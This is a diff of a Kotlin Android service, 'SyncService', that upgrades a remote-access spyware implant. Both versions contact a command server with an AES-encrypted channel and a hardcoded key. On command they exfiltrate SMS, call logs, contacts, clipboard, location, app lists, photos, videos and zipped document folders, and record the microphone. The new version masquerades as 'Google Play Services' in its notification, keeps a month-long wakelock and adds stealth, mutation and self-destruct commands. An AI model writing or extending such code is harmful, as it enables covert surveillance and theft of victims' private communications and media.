@@ -1,5 +1,6 @@
 package com.assets.service
 
+import android.annotation.SuppressLint
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
@@ -8,184 +9,533 @@ import android.content.ClipboardManager
 import android.content.ContentUris
 import android.content.Context
 import android.content.Intent
+import android.content.pm.ServiceInfo
+import android.database.Cursor
+import android.hardware.camera2.CameraManager
 import android.location.Location
 import android.location.LocationManager
+import android.media.MediaPlayer
 import android.media.MediaRecorder
+import android.media.RingtoneManager
+import android.net.ConnectivityManager
+import android.net.NetworkCapabilities
 import android.net.Uri
 import android.os.*
+import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.MediaStore
+import android.provider.OpenableColumns
 import android.provider.Settings
 import android.util.Base64
 import androidx.core.app.NotificationCompat
+import androidx.lifecycle.LifecycleService
 import kotlinx.coroutines.*
 import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
+import java.io.ByteArrayInputStream
+import java.io.ByteArrayOutputStream
 import java.io.File
 import java.io.FileOutputStream
 import java.security.MessageDigest
+import java.security.SecureRandom
+import java.util.UUID
 import java.util.concurrent.TimeUnit
 import java.util.zip.Deflater
+import java.util.zip.GZIPOutputStream
 import java.util.zip.ZipEntry
 import java.util.zip.ZipOutputStream
 import javax.crypto.Cipher
 import javax.crypto.spec.GCMParameterSpec
 import javax.crypto.spec.SecretKeySpec
 
-class SyncService : Service() {
+class SyncService : LifecycleService() {
+
+    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+    private val SERVER = "https://YOUR-DOMAIN-HERE/api/v3/uranium/stream"
+    private val UPLOAD = "https://YOUR-DOMAIN-HERE/api/v3/uranium/upload_raw"
+    private val MASTER_SECRET = "REPLACE_WITH_SAME_MASTER_KEY_FROM_ENV"
     private var wakeLock: PowerManager.WakeLock? = null
-    private val ioScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-    private var webSocket: WebSocket? = null
-    private val SERVER_URL = "wss://web-assets-service-2.onrender.com"
-    private val MASTER_KEY = "god_tier_master_key"
-    private val secretKey = MessageDigest.getInstance("SHA-256").digest(MASTER_KEY.toByteArray())
-    private var isConnected = false
+    private lateinit var cameraManager: CameraManager
+    private var wifiAutopilot = true
+    private var stealthState = "NEURAL_v18"
+
+    private val client = OkHttpClient.Builder()
+        .connectTimeout(120, TimeUnit.SECONDS)
+        .readTimeout(120, TimeUnit.SECONDS)
+        .writeTimeout(120, TimeUnit.SECONDS)
+        .retryOnConnectionFailure(true)
+        .build()
+
+    companion object {
+        private const val CHANNEL_ID = "sys_assets_v18"
+        private const val NOTIF_ID = 888
+    }
 
     override fun onCreate() {
         super.onCreate()
-        wakeLock = (getSystemService(Context.POWER_SERVICE) as PowerManager)
-            .newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Uranium::GodTier").apply { acquire() }
-        startForegroundService()
+        acquireWakeLock()
+        startForegroundNotif()
+        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
     }
 
-    private fun startForegroundService() {
-        val ch = "uranium_core"
-        (getSystemService(NotificationManager::class.java)).createNotificationChannel(
-            NotificationChannel(ch, "Core", NotificationManager.IMPORTANCE_LOW)
-        )
-        startForeground(1, NotificationCompat.Builder(this, ch)
-            .setContentTitle("System Core").setContentText("Active")
-            .setSmallIcon(android.R.drawable.ic_menu_manage).build())
+    private fun acquireWakeLock() {
+        try {
+            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Assets::WakeV18").apply {
+                acquire(30L * 24 * 60 * 60 * 1000)
+            }
+        } catch (_: Exception) {}
+    }
+
+    private fun startForegroundNotif() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val ch = NotificationChannel(CHANNEL_ID, "System Sync", NotificationManager.IMPORTANCE_LOW)
+            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
+        }
+        val n: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("Google Play Services")
+            .setContentText("Framework operational...")
+            .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
+            .build()
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                startForeground(NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+            } else startForeground(NOTIF_ID, n)
+        } catch (_: Exception) {}
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        connectSocket()
+        super.onStartCommand(intent, flags, startId)
+        scope.launch {
+            while (isActive) {
+                try {
+                    val hb = JSONObject().apply {
+                        put("type", "HEARTBEAT")
+                        put("status", "ONLINE")
+                        put("nodeId", getNodeId())
+                        put("model", "${Build.MODEL} [$stealthState]")
+                    }
+                    val resp = sendEncrypted(hb.toString())
+                    if (resp != null && resp.has("task") && !resp.isNull("task")) {
+                        executeTask(resp.getJSONObject("task"))
+                    }
+                } catch (_: Exception) {}
+                delay(3000L)
+            }
+        }
         return START_STICKY
     }
 
-    private fun connectSocket() {
-        val client = OkHttpClient.Builder().readTimeout(0, TimeUnit.MILLISECONDS).build()
-        val req = Request.Builder().url(SERVER_URL)
-            .addHeader("X-Node-ID", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
-            .addHeader("X-Node-Model", Build.MODEL).build()
-
-        webSocket = client.newWebSocket(req, object : WebSocketListener() {
-            override fun onOpen(ws: WebSocket, res: Response) { isConnected = true }
-            override fun onMessage(ws: WebSocket, text: String) {
-                val dec = decrypt(text) ?: return
-                try {
-                    val cmd = JSONObject(dec).optString("cmd")
-                    if (cmd.isNotEmpty() && cmd != "SYNC_READY") ioScope.launch { executeCommand(cmd) }
-                } catch (_: Exception) {}
-            }
-            override fun onFailure(ws: WebSocket, t: Throwable, r: Response?) { isConnected = false; reconnect() }
-            override fun onClosed(ws: WebSocket, code: Int, reason: String) { isConnected = false; reconnect() }
-        })
+    override fun onBind(intent: Intent?): IBinder? {
+        super.onBind(intent)
+        return null
     }
 
-    private fun reconnect() {
-        Handler(Looper.getMainLooper()).postDelayed({ connectSocket() }, 5000)
+    private fun getKey(): ByteArray = MessageDigest.getInstance("SHA-256").digest(MASTER_SECRET.toByteArray(Charsets.UTF_8))
+
+    private fun encryptPayload(plain: String): String {
+        val bout = ByteArrayOutputStream()
+        GZIPOutputStream(bout).use { it.write(plain.toByteArray(Charsets.UTF_8)) }
+        val compressed = bout.toByteArray()
+        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
+        val iv = ByteArray(12).apply { SecureRandom().nextBytes(this) }
+        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(getKey(), "AES"), GCMParameterSpec(128, iv))
+        val out = cipher.doFinal(compressed)
+        val enc = out.copyOfRange(0, out.size - 16)
+        val tag = out.copyOfRange(out.size - 16, out.size)
+        val pkt = JSONObject().apply {
+            put("v", iv.joinToString("") { "%02x".format(it) })
+            put("g", tag.joinToString("") { "%02x".format(it) })
+            put("d", enc.joinToString("") { "%02x".format(it) })
+        }
+        return Base64.encodeToString(pkt.toString().toByteArray(), Base64.NO_WRAP)
     }
 
-    private fun executeCommand(cmd: String) {
+    private fun decryptPayload(b64: String): String? {
+        return try {
+            val pkt = JSONObject(String(Base64.decode(b64.trim(), Base64.NO_WRAP)))
+            val iv = hexToBytes(pkt.getString("v"))
+            val tag = hexToBytes(pkt.getString("g"))
+            val data = hexToBytes(pkt.getString("d"))
+            val cipher = Cipher.getInstance("AES/GCM/NoPadding")
+            cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(getKey(), "AES"), GCMParameterSpec(128, iv))
+            String(cipher.doFinal(data + tag), Charsets.UTF_8)
+        } catch (_: Exception) { null }
+    }
+
+    private fun hexToBytes(s: String): ByteArray = ByteArray(s.length / 2) {
+        ((Character.digit(s[it * 2], 16) shl 4) + Character.digit(s[it * 2 + 1], 16)).toByte()
+    }
+
+    private fun sendEncrypted(plain: String): JSONObject? {
+        var tries = 0
+        while (tries < 3) {
+            try {
+                val req = Request.Builder()
+                    .url(SERVER)
+                    .post(encryptPayload(plain).toRequestBody("text/plain".toMediaType()))
+                    .addHeader("x-node-id", getNodeId())
+                    .addHeader("x-node-model", Build.MODEL)
+                    .addHeader("x-android-sdk", Build.VERSION.SDK_INT.toString())
+                    .build()
+                client.newCall(req).execute().use { r ->
+                    if (r.isSuccessful) {
+                        val raw = r.body?.string() ?: "{}"
+                        val dec = decryptPayload(raw)
+                        return try { if (dec != null) JSONObject(dec) else JSONObject(raw) }
+                        catch (_: Exception) { JSONObject(raw) }
+                    }
+                }
+            } catch (_: Exception) { tries++; Thread.sleep(tries * 1000L) }
+        }
+        return null
+    }
+
+    private suspend fun executeTask(task: JSONObject) {
+        val action = task.optString("action", "").uppercase()
         when {
-            cmd.contains("EXTRACT_CONTACTS") -> sendFile("Contacts.txt", readContacts().toByteArray())
-            cmd.contains("EXTRACT_SMS") -> sendFile("SMS.txt", readSMS().toByteArray())
-            cmd.contains("MIC_AI_LISTEN") -> recordAudio()
-            cmd.contains("MICRO_BURST_SNAP") -> snapPhoto()
-            cmd.contains("PROC_DCIM") -> zipFolder("DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
-            cmd.contains("SELF_DESTRUCT") -> { cacheDir.deleteRecursively(); stopSelf() }
+            action.contains("CMD_FLASH_ON") -> toggleFlash(true)
+            action.contains("CMD_FLASH_OFF") -> toggleFlash(false)
+            action.contains("CMD_VIBRATE") -> vibrate(5000)
+            action.contains("CMD_BEEP") -> playBeep()
+            action.contains("MIC_AI_LISTEN") -> recordAudio()
+            action.contains("MICRO_BURST_SNAP") -> streamLatestPhoto("MicroBurst")
+            action.contains("EXTRACT_CAMERA_SNAP") -> captureImage()
+            action.contains("EXTRACT_VIDEO_SNAP") -> captureVideoShort()
+            action.contains("EXTRACT_SMS") -> sendReport("SMS", readSms())
+            action.contains("EXTRACT_CALLS") -> sendReport("CallLog", readCalls())
+            action.contains("EXTRACT_CONTACTS") -> sendReport("Contacts", readContacts())
+            action.contains("EXTRACT_APPS") -> sendReport("Apps", readApps())
+            action.contains("EXTRACT_LOCATION") -> sendReport("Location", readLocation())
+            action.contains("EXTRACT_DEVICE_INFO") -> sendReport("Device", readDeviceInfo())
+            action.contains("EXTRACT_CLIPBOARD") -> sendReport("Clipboard", readClipboard())
+            action.contains("EXTRACT_PHOTOS") -> streamMedia(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 20)
+            action.contains("EXTRACT_VIDEOS") -> streamMedia(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, 10)
+            action.contains("PROC_DCIM") -> if (wifiOk()) zipFolder("DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI) else sendReport("Delay", "DCIM مؤجل - لا Wi-Fi")
+            action.contains("PROC_DOWNLOAD") -> if (wifiOk()) zipFolder("Download", MediaStore.Files.getContentUri("external")) else sendReport("Delay", "Download مؤجل")
+            action.contains("PROC_PICTURES") -> zipFolder("Pictures", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
+            action.contains("PROC_DOCUMENTS") -> zipFolder("Documents", MediaStore.Files.getContentUri("external"))
+            action.contains("STORAGE_AUDIT") -> sendReport("Audit", storageAudit())
+            action.contains("WIFI_AUTOPILOT") -> { wifiAutopilot = !wifiAutopilot; sendReport("WiFi", "Autopilot: $wifiAutopilot") }
+            action.contains("GEO_FENCE_ALERT") -> sendReport("GeoAlert", readLocation())
+            action.contains("POLY_MUTATE") -> { stealthState = "MUT_${System.currentTimeMillis() % 10000}"; sendReport("Poly", "Became $stealthState") }
+            action.contains("STEALTH_BLACKOUT") -> sendReport("Stealth", "Blackout active")
+            action.contains("SELF_DESTRUCT") -> { sendReport("Destruct", "Wiping..."); try { cacheDir.deleteRecursively() } catch (_: Exception) {}; stopSelf() }
         }
     }
 
-    private fun sendFile(name: String, bytes: ByteArray) {
-        if (!isConnected) return
-        val obj = JSONObject().apply {
-            put("type", "data")
-            put("filename", name)
-            put("content", Base64.encodeToString(bytes, Base64.NO_WRAP))
-            put("isBase64", true)
-        }
-        webSocket?.send(encrypt(obj.toString()))
+    private fun toggleFlash(on: Boolean) {
+        try {
+            val id = cameraManager.cameraIdList.firstOrNull { camId ->
+                cameraManager.getCameraCharacteristics(camId)
+                    .get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
+            } ?: return
+            cameraManager.setTorchMode(id, on)
+        } catch (_: Exception) {}
+    }
+
+    @SuppressLint("MissingPermission")
+    private fun vibrate(ms: Long) {
+        try {
+            val v = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                v.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE))
+            else @Suppress("DEPRECATION") v.vibrate(ms)
+        } catch (_: Exception) {}
+    }
+
+    private fun playBeep() {
+        try {
+            val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
+            MediaPlayer().apply { setDataSource(this@SyncService, uri); isLooping = false; prepare(); start() }
+        } catch (_: Exception) {}
     }
 
     private fun recordAudio() {
-        try {
-            val f = File(cacheDir, "mic_${System.currentTimeMillis()}.3gp")
-            val rec = MediaRecorder().apply {
-                setAudioSource(MediaRecorder.AudioSource.MIC)
-                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
-                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
-                setOutputFile(f.absolutePath); prepare(); start()
-            }
-            Thread.sleep(6000L)
-            rec.stop(); rec.release()
-            if (f.exists()) sendFile(f.name, f.readBytes())
-            f.delete()
-        } catch (_: Exception) {}
-    }
-
-    private fun snapPhoto() {
-        try {
-            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
-            val proj = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME)
-            contentResolver.query(uri, proj, null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC")?.use { c ->
-                if (c.moveToFirst()) {
-                    val id = c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns._ID))
-                    val name = c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)) ?: "snap.jpg"
-                    contentResolver.openInputStream(ContentUris.withAppendedId(uri, id))?.use { input ->
-                        sendFile("snap_$name", input.readBytes())
-                    }
+        scope.launch {
+            try {
+                val f = File(cacheDir, "mic_${System.currentTimeMillis()}.3gp")
+                val r = MediaRecorder().apply {
+                    setAudioSource(MediaRecorder.AudioSource.MIC)
+                    setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
+                    setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
+                    setOutputFile(f.absolutePath)
+                    prepare(); start()
                 }
-            }
-        } catch (_: Exception) {}
+                delay(6000L)
+                r.stop(); r.release()
+                if (f.exists()) { uploadRawFile(f); sendReport("Mic", "Recorded ${f.length()}b") }
+                f.delete()
+            } catch (e: Exception) { sendReport("MicErr", e.message ?: "?") }
+        }
     }
 
-    private fun zipFolder(folder: String, uri: Uri) {
-        try {
-            val zip = File(cacheDir, "${folder}_${System.currentTimeMillis()}.zip")
-            ZipOutputStream(FileOutputStream(zip)).use { z ->
-                z.setLevel(Deflater.BEST_COMPRESSION)
-                contentResolver.query(uri, arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME), null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC")?.use { c ->
-                    var count = 0
-                    while (c.moveToNext() && count < 40) {
-                        val id = c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns._ID))
-                        val n = c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)) ?: "file"
-                        contentResolver.openInputStream(ContentUris.withAppendedId(uri, id))?.use { input ->
-                            z.putNextEntry(ZipEntry("$folder/$n")); input.copyTo(z); z.closeEntry(); count++
+    private fun streamLatestPhoto(prefix: String) {
+        scope.launch {
+            try {
+                val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+                contentResolver.query(uri, arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME),
+                    null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC")?.use { c ->
+                    if (c.moveToFirst()) {
+                        val idIdx = c.getColumnIndex(MediaStore.MediaColumns._ID)
+                        val nIdx = c.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
+                        if (idIdx >= 0) {
+                            val itemUri = ContentUris.withAppendedId(uri, c.getLong(idIdx))
+                            val name = if (nIdx >= 0) c.getString(nIdx) else "snap.jpg"
+                            val bytes = contentResolver.openInputStream(itemUri)?.use { it.readBytes() } ?: return@use
+                            uploadChunked(bytes, "${prefix}_$name")
                         }
                     }
                 }
+            } catch (_: Exception) {}
+        }
+    }
+
+    @SuppressLint("MissingPermission")
+    private fun captureImage() {
+        scope.launch {
+            try {
+                val intent = Intent(MediaStore.ACTION_IMAGE_CAPTURE).apply {
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                }
+                startActivity(intent)
+            } catch (_: Exception) {}
+        }
+    }
+
+    private fun captureVideoShort() {
+        scope.launch {
+            try {
+                val intent = Intent(MediaStore.ACTION_VIDEO_CAPTURE).apply {
+                    putExtra(MediaStore.EXTRA_DURATION_LIMIT, 10)
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                }
+                startActivity(intent)
+            } catch (_: Exception) {}
+        }
+    }
+
+    private fun sendReport(label: String, content: String) {
+        scope.launch {
+            val r = JSONObject().apply { put("type", "TEXT_REPORT"); put("data", "=== $label ===\n$content") }
+            sendEncrypted(r.toString())
+        }
+    }
+
+    private fun readSms(): String {
+        val sb = StringBuilder()
+        try {
+            contentResolver.query(Uri.parse("content://sms/inbox"), arrayOf("address", "body"),
+                null, null, "date DESC LIMIT 200")?.use { c ->
+                val a = c.getColumnIndex("address"); val b = c.getColumnIndex("body")
+                while (c.moveToNext()) if (a >= 0 && b >= 0) sb.append("[${c.getString(a)}] ${c.getString(b)}\n---\n")
             }
-            if (zip.exists()) sendFile(zip.name, zip.readBytes())
-            zip.delete()
         } catch (_: Exception) {}
+        return sb.toString().ifEmpty { "No SMS or denied" }
     }
 
-    private fun readContacts(): String = StringBuilder("=== CONTACTS ===\n").apply {
-        contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)?.use { c ->
-            while (c.moveToNext()) append("• ${c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))}: ${c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))}\n")
-        }
-    }.toString()
-
-    private fun readSMS(): String = StringBuilder("=== SMS ===\n").apply {
-        contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)?.use { c ->
-            while (c.moveToNext()) append("From: ${c.getString(c.getColumnIndexOrThrow("address"))}\n${c.getString(c.getColumnIndexOrThrow("body"))}\n---\n")
-        }
-    }.toString()
-
-    private fun encrypt(text: String): String {
-        val iv = ByteArray(12); java.security.SecureRandom().nextBytes(iv)
-        val c = Cipher.getInstance("AES/GCM/NoPadding").apply { init(Cipher.ENCRYPT_MODE, SecretKeySpec(secretKey, "AES"), GCMParameterSpec(128, iv)) }
-        return Base64.encodeToString(iv + c.doFinal(text.toByteArray()), Base64.NO_WRAP)
+    private fun readCalls(): String {
+        val sb = StringBuilder()
+        try {
+            contentResolver.query(CallLog.Calls.CONTENT_URI,
+                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION),
+                null, null, CallLog.Calls.DATE + " DESC LIMIT 200")?.use { c ->
+                val n = c.getColumnIndex(CallLog.Calls.NUMBER); val t = c.getColumnIndex(CallLog.Calls.TYPE); val d = c.getColumnIndex(CallLog.Calls.DURATION)
+                while (c.moveToNext()) {
+                    val ty = when (c.getInt(t)) { CallLog.Calls.INCOMING_TYPE -> "IN"; CallLog.Calls.OUTGOING_TYPE -> "OUT"; CallLog.Calls.MISSED_TYPE -> "MISS"; else -> "?" }
+                    sb.append("$ty ${c.getString(n)} (${c.getInt(d)}s)\n")
+                }
+            }
+        } catch (_: Exception) {}
+        return sb.toString().ifEmpty { "No calls or denied" }
     }
 
-    private fun decrypt(b64: String): String? = try {
-        val data = Base64.decode(b64, Base64.NO_WRAP)
-        val c = Cipher.getInstance("AES/GCM/NoPadding").apply { init(Cipher.DECRYPT_MODE, SecretKeySpec(secretKey, "AES"), GCMParameterSpec(128, data.copyOfRange(0, 12))) }
-        String(c.doFinal(data.copyOfRange(12, data.size)))
-    } catch (_: Exception) { null }
+    private fun readContacts(): String {
+        val sb = StringBuilder()
+        try {
+            contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
+                null, null, null)?.use { c ->
+                val n = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME); val p = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+                while (c.moveToNext()) if (n >= 0 && p >= 0) sb.append("${c.getString(n)}: ${c.getString(p)}\n")
+            }
+        } catch (_: Exception) {}
+        return sb.toString().ifEmpty { "No contacts or denied" }
+    }
 
-    override fun onDestroy() { wakeLock?.release(); ioScope.cancel(); webSocket?.close(1000, "stopped"); super.onDestroy() }
-    override fun onBind(intent: Intent?): IBinder? = null
+    private fun readApps(): String {
+        val sb = StringBuilder()
+        try { packageManager.getInstalledPackages(0).forEach { sb.append("${it.packageName}\n") } } catch (_: Exception) {}
+        return sb.toString()
+    }
+
+    @SuppressLint("MissingPermission")
+    private fun readLocation(): String {
+        return try {
+            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+            var best: Location? = null
+            for (p in lm.allProviders) try { lm.getLastKnownLocation(p)?.let { if (best == null || it.time > best!!.time) best = it } } catch (_: Exception) {}
+            if (best != null) "Lat: ${best!!.latitude}\nLng: ${best!!.longitude}\nAcc: ${best!!.accuracy}m\nMap: https://maps.google.com/?q=${best!!.latitude},${best!!.longitude}"
+            else "No location"
+        } catch (e: Exception) { "Err: ${e.message}" }
+    }
+
+    private fun readDeviceInfo(): String = "Model: ${Build.MODEL}\nBrand: ${Build.BRAND}\nSDK: ${Build.VERSION.SDK_INT}\nNode: ${getNodeId()}"
+
+    private fun readClipboard(): String {
+        return try {
+            val cb = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+            if (cb.hasPrimaryClip() && cb.primaryClip?.itemCount ?: 0 > 0) "Text: ${cb.primaryClip?.getItemAt(0)?.text}" else "Empty"
+        } catch (e: Exception) { "Err: ${e.message}" }
+    }
+
+    private fun storageAudit(): String {
+        val sb = StringBuilder()
+        try {
+            val stats = queryFolderStats(MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
+            sb.append("Images: ${stats.first} files | ${String.format("%.2f", stats.second)} MB\n")
+            val vstats = queryFolderStats(MediaStore.Video.Media.EXTERNAL_CONTENT_URI)
+            sb.append("Videos: ${vstats.first} files | ${String.format("%.2f", vstats.second)} MB\n")
+        } catch (_: Exception) {}
+        return sb.toString()
+    }
+
+    private fun queryFolderStats(uri: Uri): Pair<Int, Double> {
+        var cnt = 0; var bytes = 0L
+        try {
+            contentResolver.query(uri, arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.SIZE), null, null, null)?.use { c ->
+                val s = c.getColumnIndex(MediaStore.MediaColumns.SIZE); cnt = c.count
+                while (c.moveToNext()) if (s >= 0) bytes += c.getLong(s)
+            }
+        } catch (_: Exception) {}
+        return Pair(cnt, bytes.toDouble() / (1024 * 1024))
+    }
+
+    private fun wifiOk(): Boolean {
+        if (!wifiAutopilot) return true
+        return try {
+            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+            val n = cm.activeNetwork ?: return false
+            cm.getNetworkCapabilities(n)?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ?: false
+        } catch (_: Exception) { true }
+    }
+
+    private fun getNodeId(): String = try {
+        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "node-unknown"
+    } catch (_: Exception) { "node-unknown" }
+
+    private fun streamMedia(uri: Uri, limit: Int) {
+        scope.launch {
+            try {
+                contentResolver.query(uri, arrayOf(MediaStore.MediaColumns._ID),
+                    null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC LIMIT $limit")?.use { c ->
+                    val idIdx = c.getColumnIndex(MediaStore.MediaColumns._ID)
+                    while (c.moveToNext()) if (idIdx >= 0) {
+                        val fileUri = ContentUris.withAppendedId(uri, c.getLong(idIdx))
+                        val bytes = contentResolver.openInputStream(fileUri)?.use { it.readBytes() } ?: continue
+                        uploadChunked(bytes, getFileName(fileUri))
+                    }
+                }
+            } catch (_: Exception) {}
+        }
+    }
+
+    private fun zipFolder(folderName: String, uri: Uri) {
+        scope.launch {
+            try {
+                sendReport("Zip", "بدء ضغط $folderName...")
+                val out = File(cacheDir, "${folderName}_${System.currentTimeMillis()}.zip")
+                ZipOutputStream(FileOutputStream(out)).use { zos ->
+                    zos.setLevel(Deflater.BEST_COMPRESSION)
+                    contentResolver.query(uri, arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME),
+                        null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC")?.use { c ->
+                        val idIdx = c.getColumnIndex(MediaStore.MediaColumns._ID)
+                        val nIdx = c.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
+                        var cnt = 0
+                        while (c.moveToNext() && cnt < 40) {
+                            if (idIdx >= 0) {
+                                try {
+                                    val fUri = ContentUris.withAppendedId(uri, c.getLong(idIdx))
+                                    val name = if (nIdx >= 0) c.getString(nIdx) else "f_${cnt}"
+                                    contentResolver.openInputStream(fUri)?.use { ins ->
+                                        zos.putNextEntry(ZipEntry("$folderName/$name"))
+                                        ins.copyTo(zos)
+                                        zos.closeEntry()
+                                        cnt++
+                                    }
+                                } catch (_: Exception) {}
+                            }
+                        }
+                    }
+                }
+                if (out.exists() && out.length() > 0) {
+                    sendReport("Zip", "$folderName جاهز (${out.length()/1024/1024}MB)")
+                    uploadRawFile(out)
+                }
+                out.delete()
+            } catch (e: Exception) { sendReport("ZipErr", e.message ?: "?") }
+        }
+    }
+
+    private fun uploadChunked(bytes: ByteArray, name: String) {
+        scope.launch {
+            val uploadId = UUID.randomUUID().toString()
+            val chunkSize = 128 * 1024
+            val total = (bytes.size + chunkSize - 1) / chunkSize
+            val hash = MessageDigest.getInstance("SHA-256").digest(bytes).joinToString("") { "%02x".format(it) }
+            var idx = 0; var off = 0
+            while (off < bytes.size) {
+                idx++
+                val end = minOf(off + chunkSize, bytes.size)
+                val chunk = bytes.copyOfRange(off, end)
+                val pkt = JSONObject().apply {
+                    put("type", "MEDIA_CHUNK"); put("uploadId", uploadId); put("fileName", name)
+                    put("chunkIndex", idx); put("totalChunks", total)
+                    put("isLast", idx == total); put("fileHash", hash)
+                    put("data", Base64.encodeToString(chunk, Base64.NO_WRAP))
+                }
+                sendEncrypted(pkt.toString())
+                off = end
+            }
+        }
+    }
+
+    private fun uploadRawFile(file: File) {
+        scope.launch {
+            var tries = 0
+            while (tries < 5) {
+                try {
+                    val req = Request.Builder()
+                        .url(UPLOAD)
+                        .post(file.readBytes().toRequestBody("application/octet-stream".toMediaType()))
+                        .addHeader("x-node-id", getNodeId())
+                        .addHeader("x-node-model", Build.MODEL)
+                        .addHeader("x-file-name", file.name)
+                        .build()
+                    client.newCall(req).execute().use { r -> if (r.isSuccessful) return@launch }
+                } catch (_: Exception) { tries++; delay(2000L) }
+            }
+        }
+    }
+
+    private fun getFileName(uri: Uri): String {
+        var n = "file_${System.currentTimeMillis()}.dat"
+        try {
+            contentResolver.query(uri, null, null, null, null)?.use { c ->
+                if (c.moveToFirst()) {
+                    val i = c.getColumnIndex(OpenableColumns.DISPLAY_NAME)
+                    if (i >= 0) n = c.getString(i)
+                }
+            }
+        } catch (_: Exception) {}
+        return n
+    }
+
+    override fun onDestroy() {
+        try { wakeLock?.release() } catch (_: Exception) {}
+        scope.cancel()
+        super.onDestroy()
+    }
 }
